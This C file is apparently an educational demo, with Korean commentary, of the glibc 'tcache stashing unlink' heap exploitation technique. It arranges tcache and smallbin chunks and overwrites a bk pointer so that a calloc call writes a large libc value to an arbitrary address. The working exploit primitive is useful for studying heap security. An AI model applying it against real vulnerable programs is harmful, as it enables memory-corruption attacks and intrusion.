#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>

static uint64_t victim = 0;

int main(int argc, char **argv){
	setbuf(stdout, 0);
	setbuf(stderr, 0);

	char *t1;
	char *s1, *s2, *pad;
	char *tmp;
	printf("tcache-stashing-unlink \n");
	printf("unsortedbin attack을 수행하는 대신에 이 기법을 활용하면 임의의 주소에 큰 값을 쓰는 작업이 가능합니다. \n");

	printf("\n1. 공격 대상 주소와 힙주소 leak이 필요합니다. .\n");

	tmp = malloc(0x1);
	printf("목표 대상 주소: %p, 원본 값: 0x%lx\n", &victim, victim);
	printf("힙 주소: %p\n", tmp-0x260);

	printf("\n2. 티캐시 리스트에 올릴 같은 크기를 가지는 6개의 할당 해제된 청크가 필요합니다.\n");
	printf("예로, 0x60크기의 청크를 할당 후 해제합니다.\n");
	for(int i=0; i<6; i++){
		t1 = calloc(1, 0x50);
		free(t1);
	}

	printf("따라서, 현재 tcache entry[4] 리스트는 다음과 같이 구성됩니다. %p --> %p --> %p --> %p --> %p --> %p\n", 
		t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4, t1-0x60*5);

	printf("\n3. tcache_entry와 같은 크기를 가지는 두개의 청크를 동일한 smallbin 에 넣어야 합니다.\n");

	s1 = malloc(0x420);
	printf("할당한 청크는 %p, tcache 영역을 넘어가는 크기를 가지고 있습니다. \n", s1);
	pad = malloc(0x20);
	printf("패딩 역할을 할 %p 청크를 할당합니다. 이는 탑 청크와의 병합을 막습니다. \n", s1);
	free(s1);
	printf("청크 %p 를 할당 해제하여 unsortedbin에 넣습니다. \n", s1);
	malloc(0x3c0);
	printf("unsortedbin 에 남아있는 공간이 0x60이 되게끔 크기를 계산하여 할당을 진행합니다. \n");
	malloc(0x100);
	printf("unsortedbin에 남아있는 공간보다 큰 청크를 할당할 시, 해당 영역에 남아있던 0x60 청크가 tcache를 거치지 않고 smallbins 으로 사용됩니다.\n");
	printf(" smallbin[4]에 있는 청크 %p 는 0x60 크기를 가집니다.\n", s1+0x3c0);

	printf("위 과정을 반복하면서 다른 청크를 할당 해제하여 동일한 smallbin 에 넣습니다. \n");
	printf("두 번째 패딩 역할을 하는 청크의 크기가 0x60보다 작다면, smallbin[4]에 있는 첫번째 청크가 손상될 것입니다.\n");
	s2 = malloc(0x420);
	pad = malloc(0x80);
	free(s2);
	malloc(0x3c0);
	malloc(0x100);
	printf("청크 %p 는 smallbin[4]에 위치하며, 0x60 크기를 가집니다.\n", s2+0x3c0);
	printf("이제 smallbin[4](2) 리스트가 만들어졌으며, 다음과 같이 구성됩니다. \n%p <smallbin[4](1)> <--> %p <smallbin[4](2)> \n", s2+0x3c0, s1+0x3c0);

	printf("\n4. smallbin[4](2)->fd가 먼저 할당되었던 청크 smallbin[4](1)를 가리키고, smallbin[4](2)의 bk 포인터를 &victim-0x10 로 덮어씁니다.  \n");
	
	printf("smallbin[4](2)인 %p 청크의 bk 포인터를 &victim-0x10 의 주소 0x%lx로 변경합니다. \n", s2+0x3c0, (uint64_t)(&victim)-0x10);
	*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&victim)-0x10;

	printf("\n5. smallbin[4]에 calloc을 수행하면 smallbin 상에서 stash-mechanism 이 실행됩니다.\n");

	calloc(1, 0x50);

	printf("목표로 하는 영역의 값이 큰 수-main_arena의 주소로 바뀌었습니다. \n");
	printf("변조된 값 : 0x%lx\n", victim);
	return 0;
}	
